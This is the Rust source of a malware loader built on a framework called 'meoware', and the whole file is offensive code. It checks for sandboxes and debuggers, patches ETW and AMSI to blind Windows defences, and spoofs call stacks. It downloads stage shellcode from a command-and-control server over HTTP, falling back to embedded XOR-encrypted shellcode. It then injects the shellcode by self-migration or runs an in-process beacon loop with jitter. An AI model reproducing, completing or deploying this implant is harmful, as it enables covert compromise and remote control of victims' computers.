#![cfg_attr(not(any(debug_assertions, feature = "verbose")), no_std)]

use meoware::core::net::beacon;
use meoware::core::net::transport::HttpSession;
use meoware::core::{amsi, anti_debug, etw, migration, nt, sandbox, spoof, ssn_table};
use meoware::debug;

// Build time generated key
include!(concat!(env!("OUT_DIR"), "/xor_key.rs"));

// Encrypted payload
const ENCRYPTED_PE: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload.enc"));
const ENCRYPTED_SC: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/shellcode.enc"));

// C2 Configuration
include!(concat!(env!("OUT_DIR"), "/c2_config.rs"));

// Runtime XOR decryption
fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect()
}


fn main() {
    unsafe {
        if !ssn_table::initialize_syscalls(core::ptr::null_mut()) {
            return;
        }

        if !sandbox::is_real_environment() {
            debug!("[SANDBOX] Environment check failed — aborting");
            return;
        }

        if !anti_debug::is_safe_environment() {
            debug!("[ANIT] Environment check failed - aborting");
            return;
        }

        etw::patch_etw();
        amsi::patch_amsi();
        spoof::initialize_spoof_gadgets();

        let shellcode = try_staged_download().unwrap_or_else(|| {
            // Fallback: use embedded shellcode
            debug!("[*] Using embedded payload ({} bytes)", ENCRYPTED_SC.len());
            xor_decrypt(ENCRYPTED_SC, &XOR_KEY)
        });

        if shellcode.len() >= 100 {
            meoware::set_shellcode(shellcode.clone());
        }

        if shellcode.len() < 100 {
            debug!("[-] Payload too small ({}), running in process", shellcode.len());
            run_beacon_inprocess();
            return;
        }

        debug!("[+] Payload ready ({} bytes)", shellcode.len());

        if migration::self_migrate(&shellcode) {
            debug!("[+] Injected -- exit");
            nt::nt_sleep(2000);
            return;
        }

        debug!("[-] Injection failed -- running in process");
        run_beacon_inprocess();
    }
}


fn try_staged_download() -> Option<Vec<u8>> {
    unsafe {
        if !ssn_table::initialize_network() {
            return None;
        }
    
        let session = HttpSession::new(&C2_HOST, C2_PORT, C2_HTTPS)?;

        // "/api/stage" UTF16
        let path: [u16; 11] = [
            b'/' as u16, b'a' as u16, b'p' as u16, b'i' as u16,
            b'/' as u16, b's' as u16, b't' as u16, b'a' as u16,
            b'g' as u16, b'e' as u16, 0,
        ];

        let encrypted = session.post(&path, &[])?;
        if encrypted.is_empty() { return None }

        let expected = ENCRYPTED_SC.len();
        debug!("[+] Stage: got {} bytes, embedded {} bytes", encrypted.len(), expected);

        // If embedded payload is a placeholder (<100bytes) trust the download
        if expected >= 100 {
            // Verify download integirty by comparing with embedded copy
            if encrypted.len() != expected {
                debug!("[-] Size mismatch, Using embedded");
                return None
            }

            // byte-by-byte verification 
            let mut mismatches = 0usize;
            let mut first_diff = 0usize;
            for i in 0..encrypted.len() {
                if encrypted[i] != ENCRYPTED_SC[i] {
                    if mismatches == 0 { first_diff = i; }
                    mismatches += 1;
                }
            }

            if mismatches > 0 {
                debug!("[-] {} bytes differ. First at offset {}. Using embedded", mismatches, first_diff);
                return None;
            }

            debug!("[+] Download verified -- exact match with embedded");
        } else {
            debug!("[+] Embedded is placeholder -- trusting staged download ({} bytes)", encrypted.len());
        }

        let shellcode = xor_decrypt(&encrypted, &XOR_KEY);
        Some(shellcode)
    }
}

fn run_beacon_inprocess() {
    unsafe {
        let c2_secret = xor_decrypt(&C2_SECRET_ENC, &XOR_KEY);
        let c2_config = beacon::C2Config {
            host: &C2_HOST,
            port: C2_PORT,
            use_https: C2_HTTPS,
            secret: &c2_secret,
            interval_ms: C2_INTERVAL,
            jitter_pct: C2_JITTER,
        };
        beacon::beacon_loop(&c2_config);
    }
}